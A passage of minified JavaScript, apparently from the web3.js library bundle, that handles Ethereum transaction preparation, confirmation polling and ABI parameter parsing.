            getId() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.defaultReturnFormat;
                return ph(this, void 0, void 0, (function*() {
                    return dh(this, e)
                }))
            }
            getPeerCount() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.defaultReturnFormat;
                return ph(this, void 0, void 0, (function*() {
                    return fh(this, e)
                }))
            }
            isListening() {
                return ph(this, void 0, void 0, (function*() {
                    return hh(this)
                }))
            }
        }
        const gh = "ALLEVENTS",
            vh = {
                name: gh,
                signature: "",
                type: "event",
                inputs: []
            },
            yh = {
                bytes: Ye.HEX,
                number: Je.NUMBER
            };
        var bh = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };

        function wh(e, t, n) {
            return bh(this, void 0, void 0, (function*() {
                const r = kh(e, t);
                if (!ss(r)) {
                    if (r.startsWith("-")) throw new Rn(r);
                    if (Number(r) < 0 || Number(r) > 127) throw new Rn(r);
                    if (ss(e.gasPrice) && ("0x0" === r || "0x1" === r)) return {
                        gasPrice: yield im(t, n), maxPriorityFeePerGas: void 0, maxFeePerGas: void 0
                    };
                    if ("0x2" === r) return Object.assign({
                        gasPrice: void 0
                    }, yield function(e, t, n) {
                        var r, i, o, a;
                        return bh(this, void 0, void 0, (function*() {
                            const s = yield um(t, t.defaultBlock, !1, $e);
                            if (ss(s.baseFeePerGas)) throw new On;
                            let c;
                            if (ss(e.gasPrice) && BigInt(s.baseFeePerGas) === BigInt(0) && (c = yield im(t, n)), !ss(e.gasPrice) || !ss(c)) {
                                const t = kc({
                                    format: "uint"
                                }, null !== (r = e.gasPrice) && void 0 !== r ? r : c, n);
                                return {
                                    maxPriorityFeePerGas: t,
                                    maxFeePerGas: t
                                }
                            }
                            return {
                                maxPriorityFeePerGas: kc({
                                    format: "uint"
                                }, null !== (i = e.maxPriorityFeePerGas) && void 0 !== i ? i : t.defaultMaxPriorityFeePerGas, n),
                                maxFeePerGas: kc({
                                    format: "uint"
                                }, null !== (o = e.maxFeePerGas) && void 0 !== o ? o : BigInt(s.baseFeePerGas) * BigInt(2) + BigInt(null !== (a = e.maxPriorityFeePerGas) && void 0 !== a ? a : t.defaultMaxPriorityFeePerGas), n)
                            }
                        }))
                    }(e, t, n))
                }
            }))
        }
        var xh = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        const Ah = (e, t, n, r) => {
                if (void 0 !== n && e in n && void 0 !== n[e]) {
                    if ("string" === typeof n[e] && Ya(n[e])) return n[e];
                    if (!_a(n[e]) && ts(n[e])) {
                        if (t.wallet) {
                            const r = t.wallet.get(kc({
                                format: "uint"
                            }, n[e], yh));
                            if (!ss(r)) return r.address;
                            throw new Gn
                        }
                        throw new Gn
                    }
                    throw "from" === e ? new hn(n.from) : new pn(n.to)
                }
                if ("from" === e) {
                    if (!ss(r)) return kf(r);
                    if (!ss(t.defaultAccount)) return t.defaultAccount
                }
            },
            kh = (e, t) => {
                const n = Wf(e, t);
                return ss(n) ? ss(t.defaultTransactionType) ? void 0 : kc({
                    format: "uint"
                }, t.defaultTransactionType, $e) : n
            };

        function Eh(e) {
            var t, n;
            return xh(this, void 0, void 0, (function*() {
                let r = kc(Xf, e.transaction, e.web3Context.defaultReturnFormat);
                if (ss(r.from) && (r.from = Ah("from", e.web3Context, void 0, e.privateKey)), ss(r.nonce) && (r.nonce = yield function(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e.defaultReturnFormat;
                        return xh(void 0, void 0, void 0, (function*() {
                            if (ss(t)) throw new Nn;
                            return ym(e, t, e.defaultBlock, n)
                        }))
                    }(e.web3Context, r.from, $e)), ss(r.value) && (r.value = "0x0"), ss(r.data)) ss(r.input) ? r.input = "0x" : r.input.startsWith("0x") || (r.input = "0x".concat(r.input));
                else {
                    if (!ss(r.input) && r.data !== r.input) throw new Mn({
                        data: As(r.data),
                        input: As(r.input)
                    });
                    r.data.startsWith("0x") || (r.data = "0x".concat(r.data))
                }
                if (ss(r.common)) {
                    if (e.web3Context.defaultCommon) {
                        const t = e.web3Context.defaultCommon,
                            n = t.customChain.chainId,
                            i = t.customChain.networkId,
                            o = t.customChain.name;
                        r.common = Object.assign(Object.assign({}, t), {
                            customChain: {
                                chainId: n,
                                networkId: i,
                                name: o
                            }
                        })
                    }
                    ss(r.chain) && (r.chain = e.web3Context.defaultChain), ss(r.hardfork) && (r.hardfork = e.web3Context.defaultHardfork)
                }
                if (ss(r.chainId) && ss(null === (t = r.common) || void 0 === t ? void 0 : t.customChain.chainId) && (r.chainId = yield Sm(e.web3Context, $e)), ss(r.networkId) && (r.networkId = null !== (n = e.web3Context.defaultNetworkId) && void 0 !== n ? n : yield dh(e.web3Context, $e)), ss(r.gasLimit) && !ss(r.gas) && (r.gasLimit = r.gas), r.type = kh(r, e.web3Context), !ss(r.accessList) || "0x1" !== r.type && "0x2" !== r.type || (r.accessList = []), e.fillGasPrice && (r = Object.assign(Object.assign({}, r), yield wh(r, e.web3Context, $e))), ss(r.gas) && ss(r.gasLimit) && e.fillGasLimit) {
                    const t = yield km(e.web3Context, r, "latest", $e);
                    r = Object.assign(Object.assign({}, r), {
                        gas: kc({
                            format: "uint"
                        }, t, $e)
                    })
                }
                return r
            }))
        }
        var Sh = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };

        function Ch(e, t, n) {
            const r = e.transactionPollingInterval,
                [i, o] = qc((() => Sh(this, void 0, void 0, (function*() {
                    let r;
                    try {
                        r = yield am(e, yh)
                    } catch (o) {
                        return void console.warn("An error happen while trying to get the block number", o)
                    }
                    const i = r - t;
                    if (i >= e.transactionBlockTimeout) return new Dn({
                        starterBlockNumber: t,
                        numberOfBlocks: i,
                        transactionHash: n
                    })
                }))), r);
            return [o, {
                clean: () => {
                    clearInterval(i)
                }
            }]
        }

        function _h(e, t) {
            var n, r;
            return Sh(this, void 0, void 0, (function*() {
                const {
                    provider: i
                } = e.requestManager;
                let o;
                const a = yield am(e, yh);
                return o = (null === (r = (n = i).supportsSubscriptions) || void 0 === r ? void 0 : r.call(n)) && e.enableExperimentalFeatures.useSubscriptionWhenCheckingBlockTimeout ? yield function(e, t, n) {
                    var r;
                    return Sh(this, void 0, void 0, (function*() {
                        let i, o, a = !0;

                        function s(r, i) {
                            i && console.warn("error happened at subscription. So revert to polling...", i), o.clean(), a = !1;
                            const [s, c] = Ch(e, t, n);
                            o.clean = c.clean, s.catch((e => r(e)))
                        }
                        try {
                            i = yield null === (r = e.subscriptionManager) || void 0 === r ? void 0 : r.subscribe("newHeads"), o = {
                                clean: () => {
                                    var t;
                                    i.id && (null === (t = e.subscriptionManager) || void 0 === t || t.removeSubscription(i).then((() => {})).catch((() => {})))
                                }
                            }
                        } catch (c) {
                            return Ch(e, t, n)
                        }
                        return [new Promise(((r, o) => {
                            try {
                                i.on("data", (r => {
                                    if (a = !1, !(null === r || void 0 === r ? void 0 : r.number)) return;
                                    const i = Number(BigInt(r.number) - BigInt(t));
                                    i >= e.transactionBlockTimeout && o(new Dn({
                                        starterBlockNumber: t,
                                        numberOfBlocks: i,
                                        transactionHash: n
                                    }))
                                })), i.on("error", (e => {
                                    s(o, e)
                                }))
                            } catch (c) {
                                s(o, c)
                            }
                            setTimeout((() => {
                                a && s(o)
                            }), 1e3 * e.blockHeaderTimeout)
                        })), o]
                    }))
                }(e, a, t): Ch(e, a, t), o
            }))
        }
        var Ih = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };

        function Ph(e, t, n) {
            return Ih(this, void 0, void 0, (function*() {
                const [r, i] = Gc(e.transactionSendTimeout, new jn({
                    numberOfSeconds: e.transactionSendTimeout / 1e3,
                    transactionHash: n
                })), [o, a] = yield _h(e, n);
                try {
                    return yield Promise.race([t(), i, o])
                } finally {
                    clearTimeout(r), a.clean()
                }
            }))
        }
        var Th = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };

        function Bh(e, t, n, r) {
            var i;
            return Th(this, void 0, void 0, (function*() {
                const o = null !== (i = e.transactionReceiptPollingInterval) && void 0 !== i ? i : e.transactionPollingInterval,
                    [a, s] = Uc((() => Th(this, void 0, void 0, (function*() {
                        try {
                            return (null !== r && void 0 !== r ? r : vm)(e, t, n)
                        } catch (i) {
                            return void console.warn("An error happen while trying to get the transaction receipt", i)
                        }
                    }))), o),
                    [c, l] = Gc(e.transactionPollingTimeout, new Ln({
                        numberOfSeconds: e.transactionPollingTimeout / 1e3,
                        transactionHash: t
                    })),
                    [u, d] = yield _h(e, t);
                try {
                    return yield Promise.race([a, l, u])
                } finally {
                    c && clearTimeout(c), s && clearInterval(s), d.clean()
                }
            }))
        }
        var Nh = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        const Oh = e => {
            let {
                web3Context: t,
                transactionReceipt: n,
                transactionPromiEvent: r,
                customTransactionReceiptSchema: i,
                returnFormat: o
            } = e;
            var a;
            let s = 1;
            const c = setInterval((() => {
                Nh(void 0, void 0, void 0, (function*() {
                    if (s >= t.transactionConfirmationBlocks) return void clearInterval(c);
                    const e = yield Lf(t.requestManager, Cs(BigInt(n.blockNumber) + BigInt(s)), !1);
                    (null === e || void 0 === e ? void 0 : e.hash) && (s += 1, r.emit("confirmation", {
                        confirmations: kc({
                            format: "uint"
                        }, s, o),
                        receipt: kc(null !== i && void 0 !== i ? i : oh, n, o),
                        latestBlockHash: kc({
                            format: "bytes32"
                        }, e.hash, o)
                    }))
                }))
            }), null !== (a = t.transactionReceiptPollingInterval) && void 0 !== a ? a : t.transactionPollingInterval)
        };
        var Rh = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };

        function Mh(e, t, n, r, i, o) {
            if (ss(n) || ss(n.blockHash)) throw new Hn({
                receipt: n,
                blockHash: kc({
                    format: "bytes32"
                }, null === n || void 0 === n ? void 0 : n.blockHash, i),
                transactionHash: kc({
                    format: "bytes32"
                }, r, i)
            });
            if (!n.blockNumber) throw new Un({
                receipt: n
            });
            t.emit("confirmation", {
                confirmations: kc({
                    format: "uint"
                }, 1, i),
                receipt: kc(null !== o && void 0 !== o ? o : oh, n, i),
                latestBlockHash: kc({
                    format: "bytes32"
                }, n.blockHash, i)
            });
            const a = e.requestManager.provider;
            a && "supportsSubscriptions" in a && a.supportsSubscriptions() ? (e => {
                let t, {
                        web3Context: n,
                        transactionReceipt: r,
                        transactionPromiEvent: i,
                        customTransactionReceiptSchema: o,
                        returnFormat: a
                    } = e,
                    s = !0;
                setImmediate((() => {
                    var e;
                    null === (e = n.subscriptionManager) || void 0 === e || e.subscribe("newHeads").then((e => {
                        e.on("data", (c => Rh(void 0, void 0, void 0, (function*() {
                            var l;
                            if (s = !1, !(null === c || void 0 === c ? void 0 : c.number) || t === (null === c || void 0 === c ? void 0 : c.parentHash)) return;
                            t = null === c || void 0 === c ? void 0 : c.parentHash;
                            const u = BigInt(c.number) - BigInt(r.blockNumber) + BigInt(1);
                            i.emit("confirmation", {
                                confirmations: kc({
                                    format: "uint"
                                }, u, a),
                                receipt: kc(null !== o && void 0 !== o ? o : oh, r, a),
                                latestBlockHash: kc({
                                    format: "bytes32"
                                }, c.parentHash, a)
                            }), u >= n.transactionConfirmationBlocks && (yield null === (l = n.subscriptionManager) || void 0 === l ? void 0 : l.removeSubscription(e))
                        })))), e.on("error", (() => Rh(void 0, void 0, void 0, (function*() {
                            var t;
                            yield null === (t = n.subscriptionManager) || void 0 === t ? void 0 : t.removeSubscription(e), s = !1, Oh({
                                web3Context: n,
                                transactionReceipt: r,
                                transactionPromiEvent: i,
                                customTransactionReceiptSchema: o,
                                returnFormat: a
                            })
                        }))))
                    })).catch((() => {
                        s = !1, Oh({
                            web3Context: n,
                            transactionReceipt: r,
                            customTransactionReceiptSchema: o,
                            transactionPromiEvent: i,
                            returnFormat: a
                        })
                    }))
                })), setTimeout((() => {
                    s && Oh({
                        web3Context: n,
                        transactionReceipt: r,
                        transactionPromiEvent: i,
                        returnFormat: a
                    })
                }), 1e3 * n.blockHeaderTimeout)
            })({
                web3Context: e,
                transactionReceipt: n,
                transactionPromiEvent: t,
                customTransactionReceiptSchema: o,
                returnFormat: i
            }) : Oh({
                web3Context: e,
                transactionReceipt: n,
                transactionPromiEvent: t,
                customTransactionReceiptSchema: o,
                returnFormat: i
            })
        }
        const jh = e => !cc(e) && "object" === typeof e && !cc(e.type) && "error" === e.type,
            Fh = e => !cc(e) && "object" === typeof e && !cc(e.type) && "event" === e.type,
            Lh = e => !cc(e) && "object" === typeof e && !cc(e.type) && "function" === e.type,
            Dh = e => "object" === typeof e && "undefined" === typeof e.components && "undefined" === typeof e.name,
            Hh = e => e.includes("[]") ? {
                type: "tuple[]",
                name: e.slice(0, -2)
            } : {
                type: "tuple",
                name: e
            },
            Uh = e => {
                const t = [];
                for (const n of Object.keys(e)) {
                    const r = e[n];
                    "object" === typeof r ? t.push(Object.assign(Object.assign({}, Hh(n)), {
                        components: Uh(r)
                    })) : t.push({
                        name: n,
                        type: e[n]
                    })
                }
                return t
            },
            zh = (e, t) => {
                const n = [];
                return t.forEach((t => {
                    if ("object" === typeof t.components) {
                        if (!t.type.startsWith("tuple")) throw new $t('Invalid value given "'.concat(t.type, '". Error: components found but type is not tuple.'));
                        const r = t.type.indexOf("["),
                            i = r >= 0 ? t.type.substring(r) : "",
                            o = zh(e, t.components);
                        Array.isArray(o) && e ? n.push("tuple(".concat(o.join(","), ")").concat(i)) : e ? n.push("(".concat(o.join(), ")")) : n.push("(".concat(o.join(","), ")").concat(i))
                    } else n.push(t.type)
                })), n
            },
            Gh = e => {
                var t, n, r, i;
                return jh(e) || Fh(e) || Lh(e) ? (null === (t = e.name) || void 0 === t ? void 0 : t.includes("(")) ? e.name : "".concat(null !== (n = e.name) && void 0 !== n ? n : "", "(").concat(zh(!1, null !== (r = e.inputs) && void 0 !== r ? r : []).join(","), ")") : "(".concat(zh(!1, null !== (i = e.inputs) && void 0 !== i ? i : []).join(","), ")")
            },
            qh = e => {
                if ("string" !== typeof e && !Fh(e)) throw new $t("Invalid parameter value in encodeEventSignature");
                let t;
                return t = !e || "function" !== typeof e && "object" !== typeof e ? e : Gh(e), _c(t)
            };

        function Qh(e, t) {
            const n = e.exec(t);
            return null === n || void 0 === n ? void 0 : n.groups
        }
        var Wh = /^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/,
            Vh = /^u?int(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/,
            Zh = /^\(.+?\).*?$/,
            Kh = Object.defineProperty,
            Jh = (e, t, n) => (((e, t, n) => {
                t in e ? Kh(e, t, {
                    enumerable: !0,
                    configurable: !0,
                    writable: !0,
                    value: n
                }) : e[t] = n
            })(e, "symbol" !== typeof t ? t + "" : t, n), n),
            Yh = class extends Error {
                constructor(e) {
                    var t;
                    let n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    const r = n.cause instanceof Yh ? n.cause.details : null !== (t = n.cause) && void 0 !== t && t.message ? n.cause.message : n.details,
                        i = n.cause instanceof Yh && n.cause.docsPath || n.docsPath;
                    super([e || "An error occurred.", "", ...n.metaMessages ? [...n.metaMessages, ""] : [], ...i ? ["Docs: https://abitype.dev".concat(i)] : [], ...r ? ["Details: ".concat(r)] : [], "Version: ".concat("abitype", "@").concat("0.7.1")].join("\n")), Jh(this, "details"), Jh(this, "docsPath"), Jh(this, "metaMessages"), Jh(this, "shortMessage"), Jh(this, "name", "AbiTypeError"), n.cause && (this.cause = n.cause), this.details = r, this.docsPath = i, this.metaMessages = n.metaMessages, this.shortMessage = e
                }
            };
        var Xh = /^struct (?<name>[a-zA-Z0-9_]+) \{(?<properties>.*?)\}$/;

        function $h(e) {
            return Xh.test(e)
        }

        function ep(e) {
            return Qh(Xh, e)
        }
        var tp = new Set(["memory", "indexed", "storage", "calldata"]),
            np = new Set(["calldata", "memory", "storage"]);
        var rp = new Map([
            ["address", {
                type: "address"
            }],
            ["bool", {
                type: "bool"
            }],
            ["bytes", {
                type: "bytes"
            }],
            ["bytes32", {
                type: "bytes32"
            }],
            ["int", {
                type: "int256"
            }],
            ["int256", {
                type: "int256"
            }],
            ["string", {
                type: "string"
            }],
            ["uint", {
                type: "uint256"
            }],
            ["uint8", {
                type: "uint8"
            }],
            ["uint16", {
                type: "uint16"
            }],
            ["uint24", {
                type: "uint24"
            }],
            ["uint32", {
                type: "uint32"
            }],
            ["uint64", {
                type: "uint64"
            }],
            ["uint96", {
                type: "uint96"
            }],
            ["uint112", {
                type: "uint112"
            }],
            ["uint160", {
                type: "uint160"
            }],
            ["uint192", {
                type: "uint192"
            }],
            ["uint256", {
                type: "uint256"
            }],
            ["address owner", {
                type: "address",
                name: "owner"
            }],
            ["address to", {
                type: "address",
                name: "to"
            }],
            ["bool approved", {
                type: "bool",
                name: "approved"
            }],
            ["bytes _data", {
                type: "bytes",
                name: "_data"
            }],
            ["bytes data", {
                type: "bytes",
                name: "data"
            }],
            ["bytes signature", {
                type: "bytes",
                name: "signature"
            }],
            ["bytes32 hash", {
                type: "bytes32",
                name: "hash"
            }],
            ["bytes32 r", {
                type: "bytes32",
                name: "r"
            }],
            ["bytes32 root", {
                type: "bytes32",
                name: "root"
            }],
            ["bytes32 s", {
                type: "bytes32",
                name: "s"
            }],
            ["string name", {
                type: "string",
                name: "name"
            }],
            ["string symbol", {
                type: "string",
                name: "symbol"
            }],
            ["string tokenURI", {
                type: "string",
                name: "tokenURI"
            }],
            ["uint tokenId", {
                type: "uint256",
                name: "tokenId"
            }],
            ["uint8 v", {
                type: "uint8",
                name: "v"
            }],
            ["uint256 balance", {
                type: "uint256",
                name: "balance"
            }],
            ["uint256 tokenId", {
                type: "uint256",
                name: "tokenId"
            }],
            ["uint256 value", {
                type: "uint256",
                name: "value"
            }],
            ["event:address indexed from", {
                type: "address",
                name: "from",
                indexed: !0
            }],
            ["event:address indexed to", {
                type: "address",
                name: "to",
                indexed: !0
            }],
            ["event:uint indexed tokenId", {
                type: "uint256",
                name: "tokenId",
                indexed: !0
            }],
            ["event:uint256 indexed tokenId", {
                type: "uint256",
                name: "tokenId",
                indexed: !0
            }]
        ]);
        var ip = /^(?<type>[a-zA-Z0-9_]+?)(?<array>(?:\[\d*?\])+?)?(?:\s(?<modifier>calldata|indexed|memory|storage{1}))?(?:\s(?<name>[a-zA-Z0-9_]+))?$/,
            op = /^\((?<type>.+?)\)(?<array>(?:\[\d*?\])+?)?(?:\s(?<modifier>calldata|indexed|memory|storage{1}))?(?:\s(?<name>[a-zA-Z0-9_]+))?$/,
            ap = /^u?int$/;

        function sp(e, t) {
            var n, r;
            const i = function(e, t) {
                return t ? "".concat(t, ":").concat(e) : e
            }(e, null === t || void 0 === t ? void 0 : t.type);
            if (rp.has(i)) return rp.get(i);
            const o = Zh.test(e),
                a = Qh(o ? op : ip, e);
            if (!a) throw new Yh("Invalid ABI parameter.", {
                details: e
            });
            if (a.name && function(e) {
                    return "address" === e || "bool" === e || "function" === e || "string" === e || "tuple" === e || Wh.test(e) || Vh.test(e) || up.test(e)
                }(a.name)) throw new Yh("Invalid ABI parameter.", {
                details: e,
                metaMessages: ['"'.concat(a.name, '" is a protected Solidity keyword. More info: https://docs.soliditylang.org/en/latest/cheatsheet.html')]
            });
            const s = a.name ? {
                    name: a.name
                } : {},
                c = "indexed" === a.modifier ? {
                    indexed: !0
                } : {},
                l = null !== (n = null === t || void 0 === t ? void 0 : t.structs) && void 0 !== n ? n : {};
            let u, d = {};
            if (o) {
                u = "tuple";
                const e = cp(a.type),
                    t = [],
                    n = e.length;
                for (let r = 0; r < n; r++) t.push(sp(e[r], {
                    structs: l
                }));
                d = {
                    components: t
                }
            } else if (a.type in l) u = "tuple", d = {
                components: l[a.type]
            };
            else if (ap.test(a.type)) u = "".concat(a.type, "256");
            else if (u = a.type, "struct" !== (null === t || void 0 === t ? void 0 : t.type) && !lp(u)) throw new Yh("Unknown type.", {
                metaMessages: ['Type "'.concat(u, '" is not a valid ABI type.')]
            });
            if (a.modifier) {
                var f, h;
                if (null === t || void 0 === t || null === (f = t.modifiers) || void 0 === f || null === (h = f.has) || void 0 === h || !h.call(f, a.modifier)) throw new Yh("Invalid ABI parameter.", {
                    details: e,
                    metaMessages: ['Modifier "'.concat(a.modifier, '" not allowed').concat(null !== t && void 0 !== t && t.type ? ' in "'.concat(t.type, '" type') : "", ".")]
                });
                if (np.has(a.modifier) && ! function(e, t) {
                        return t || "bytes" === e || "string" === e || "tuple" === e
                    }(u, !!a.array)) throw new Yh("Invalid ABI parameter.", {
                    details: e,
                    metaMessages: ['Modifier "'.concat(a.modifier, '" not allowed').concat(null !== t && void 0 !== t && t.type ? ' in "'.concat(t.type, '" type') : "", "."), 'Data location can only be specified for array, struct, or mapping types, but "'.concat(a.modifier, '" was given.')]
                })
            }
            const p = {
                type: "".concat(u).concat(null !== (r = a.array) && void 0 !== r ? r : ""),
                ...s,
                ...c,
                ...d
            };
            return rp.set(i, p), p
        }

        function cp(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [],
                n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "",
                r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : 0;
            if ("" === e) {
                if ("" === n) return t;
                if (0 !== r) throw new Yh("Unbalanced parentheses.", {
                    metaMessages: ['"'.concat(n.trim(), '" has too many ').concat(r > 0 ? "opening" : "closing", " parentheses.")],
                    details: 'Depth "'.concat(r, '"')
                });
                return [...t, n.trim()]
            }
            const i = e.length;
            for (let o = 0; o < i; o++) {
                const i = e[o],
                    a = e.slice(o + 1);
                switch (i) {
                    case ",":
                        return 0 === r ? cp(a, [...t, n.trim()]) : cp(a, t, "".concat(n).concat(i), r);
                    case "(":
                        return cp(a, t, "".concat(n).concat(i), r + 1);
                    case ")":
                        return cp(a, t, "".concat(n).concat(i), r - 1);
                    default:
                        return cp(a, t, "".concat(n).concat(i), r)
                }
            }
            return []
        }

        function lp(e) {
            return "address" === e || "bool" === e || "function" === e || "string" === e || Wh.test(e) || Vh.test(e)
        }
        var up = /^(?:after|alias|anonymous|apply|auto|byte|calldata|case|catch|constant|copyof|default|defined|error|event|external|false|final|function|immutable|implements|in|indexed|inline|internal|let|mapping|match|memory|mutable|null|of|override|partial|private|promise|public|pure|reference|relocatable|return|returns|sizeof|static|storage|struct|super|supports|switch|this|true|try|typedef|typeof|var|view|virtual)$/;

        function dp(e) {
            const t = {},
                n = e.length;
            for (let a = 0; a < n; a++) {
                const n = e[a];
                if (!$h(n)) continue;
                const r = ep(n);
                if (!r) throw new Yh("Invalid struct signature.", {
                    details: n
                });
                const i = r.properties.split(";"),
                    o = [],
                    s = i.length;
                for (let e = 0; e < s; e++) {
                    const t = i[e].trim();
                    if (!t) continue;
                    const n = sp(t, {
                        type: "struct"
                    });
                    o.push(n)
                }
                if (!o.length) throw new Yh("Invalid struct signature.", {
                    details: n,
                    metaMessages: ["No properties exist."]
                });
                t[r.name] = o
            }
            const r = {},
                i = Object.entries(t),
                o = i.length;
            for (let a = 0; a < o; a++) {
                const [e, n] = i[a];
                r[e] = hp(n, t)
            }
            return r
        }
        var fp = /^(?<type>[a-zA-Z0-9_]+?)(?<array>(?:\[\d*?\])+?)?$/;

        function hp(e, t) {
            let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : new Set;
            const r = [],
                i = e.length;
            for (let a = 0; a < i; a++) {
                const i = e[a];
                if (Zh.test(i.type)) r.push(i);
                else {
                    const e = Qh(fp, i.type);
                    if (null === e || void 0 === e || !e.type) throw new Yh("Invalid ABI parameter.", {
                        details: JSON.stringify(i, null, 2),
                        metaMessages: ["ABI parameter type is invalid."]
                    });
                    const {
                        array: a,
                        type: s
                    } = e;
                    if (s in t) {
                        var o;
                        if (n.has(s)) throw new Yh("Circular reference detected.", {
                            metaMessages: ['Struct "'.concat(s, '" is a circular reference.')]
                        });
                        r.push({ ...i,
                            type: "tuple".concat(null !== a && void 0 !== a ? a : ""),
                            components: hp(null !== (o = t[s]) && void 0 !== o ? o : [], t, new Set([...n, s]))
                        })
                    } else {
                        if (!lp(s)) throw new Yh("Unknown type.", {
                            metaMessages: ['Type "'.concat(s, '" is not a valid ABI type. Perhaps you forgot to include a struct signature?')]
                        });
                        r.push(i)
                    }
                }
            }
            return r
        }
        const pp = 32;

        function mp() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0;
            var t;
            if (void 0 !== (null === (t = globalThis.Buffer) || void 0 === t ? void 0 : t.alloc)) {
                const t = globalThis.Buffer.alloc(e);
                return new Uint8Array(t.buffer, t.byteOffset, t.byteLength)
            }
            return new Uint8Array(e)
        }

        function gp(e) {
            var t, n;
            return Object.assign(Object.assign({}, e), {
                name: null !== (t = e.name) && void 0 !== t ? t : "",
                components: null === (n = e.components) || void 0 === n ? void 0 : n.map((e => gp(e)))
            })
        }

        function vp(e) {
            return e.map((e => {
                var t, n;
                if (!cc(n = e) && "object" === typeof n && !cc(n.type) && "string" === typeof n.type) return e;
                if ("string" === typeof e) return gp(function(e) {
                    let t;
                    if ("string" === typeof e) t = sp(e, {
                        modifiers: tp
                    });
                    else {
                        const n = dp(e),
                            r = e.length;
                        for (let i = 0; i < r; i++) {
                            const r = e[i];
                            if (!$h(r)) {
                                t = sp(r, {
                                    modifiers: tp,
                                    structs: n
                                });
                                break
                            }
                        }
                    }
                    if (!t) throw new Yh("Failed to parse ABI parameter.", {
                        details: "parseAbiParameter(".concat(JSON.stringify(e, null, 2), ")"),
                        docsPath: "/api/human.html#parseabiparameter-1"
                    });
                    return t
                }(e.replace(/tuple/, "")));
                if (Dh(e)) {
                    const n = Object.keys(e)[0],
                        r = Hh(n);
                    return r.name = null !== (t = r.name) && void 0 !== t ? t : "", Object.assign(Object.assign({}, r), {
                        components: Uh(e[n])
                    })
                }
                throw new $t("Invalid abi")
            }))
        }

        function yp(e) {
            const t = e.type.lastIndexOf("["),
                n = e.type.substring(0, t),
                r = e.type.substring(t);
            let i = -1;
            if ("[]" !== r && (i = Number(r.slice(1, -1)), isNaN(i))) throw new $t("Invalid fixed array size", {
                size: r
            });
            return {
                param: {
                    type: n,
                    name: "",
                    components: e.components
                },
                size: i
            }
        }

        function bp(e) {
            var t, n;
            return !("string" !== e.type && "bytes" !== e.type && !e.type.endsWith("[]")) || ("tuple" === e.type ? null !== (n = null === (t = e.components) || void 0 === t ? void 0 : t.some(bp)) && void 0 !== n && n : !!e.type.endsWith("]") && bp(yp(e).param))
        }
        const wp = 20,
            xp = pp - wp;
        const Ap = new Map;
        let kp = BigInt(256);
        for (let n = 8; n <= 256; n += 8) Ap.set("uint".concat(n), {
            min: BigInt(0),
            max: kp - BigInt(1)
        }), Ap.set("int".concat(n), {
